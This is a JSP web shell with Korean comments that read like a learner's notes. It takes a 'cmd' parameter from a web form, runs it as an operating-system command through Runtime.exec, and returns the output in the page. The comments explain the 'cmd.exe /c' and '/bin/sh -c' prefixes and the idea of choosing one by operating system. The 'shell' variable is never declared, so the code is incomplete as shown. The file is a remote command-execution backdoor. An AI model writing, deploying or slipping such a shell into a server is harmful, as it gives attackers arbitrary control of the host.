<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process ps = null;
    BufferedReader br = null;
    String line = "";
    String result = "";
    String now_page = request.getServletPath();

    try {
        if(cmd != null) {
            ps = Runtime.getRuntime().exec(shell + cmd);
            //cmd 값만주면 dir 이런 명령어 하면 오류가남 그래서 "cmd.exe /c" +cmd 이렇게 옵션을줌
            //c옵션은 해당 그다음 인자에 나오는 이문자열을 실행해서 출력되게끔 해주는 옵션임
            //그러니까 이해당 명령어를 실행하는 단일 명령어를 실행해서 결과값을 출력해주는 역활을 하는데
            //근데 지금간ㅌ은 경우는 windows 환경일경우에 실행이되고 리눅스의 경우에는 또 바꿔줘야함
            //"/bin/sh -c 을 유추 되게끔 이렇게 바꿔줘야함 일일히 이렇게 해주기는  상당히 번거로 그렇기 때문에 조금더 운영체제별로 자동으로
            //판별을해서 저거 셋팅에 자동으로 되게끔 해야함 그래서 저부분은 shell 이라는 명령어를 사용을하고 
            br = new BufferedReader(new InputStreamReader(ps.getInputStream()));

            while((line = br.readLine()) != null) {
                result += line + "<br>";
            }
              ps.destroy();
        }

    } finally {
        if(br != null) br.close();
    }
%>

<form action="<%=now_page%>" method="POST">
<input type="text" name="cmd">
<input type="submit" value="EXECUTE">
</form>
<hr>
<% if(cmd != null) { %>
<table style="border: 1px solid black; background-color: black">
<tr>
    <td style="color: white; font-size: 12px"><%=result%></td>
</tr>
</table>
<% } %>
